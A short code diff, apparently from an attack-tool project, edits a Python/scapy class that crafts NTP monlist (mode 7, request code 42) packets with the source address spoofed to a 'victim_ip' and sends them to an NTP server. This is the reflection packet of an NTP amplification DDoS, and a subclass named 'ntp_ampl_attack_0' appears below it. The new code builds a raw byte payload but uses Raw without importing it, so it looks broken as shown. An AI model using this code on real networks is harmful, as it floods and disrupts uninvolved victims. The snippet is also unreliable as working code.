@@ -1,6 +1,6 @@
 import numpy as np
 from typing import Self
-from scapy.all import IP, UDP, NTP, Packet
+from scapy.all import IP, UDP, Packet
 
 
 class monlist:
@@ -13,8 +13,8 @@ class monlist:
     def create(self: Self) -> Packet:
         ip_layer = IP(src=self.victim_ip, dst=self.ntp_server_ip)
         udp_layer = UDP(dport=123)
-        ntp_control_layer = NTP(mode=7, version=2, implementation=3, request_code=42, data=[])
-        return ip_layer / udp_layer / ntp_control_layer
+        data = "\x17\x00\x03\x2a" + "\x00" * 4
+        return ip_layer / udp_layer / Raw(load=data)
 
 
 class ntp_ampl_attack_0(monlist):
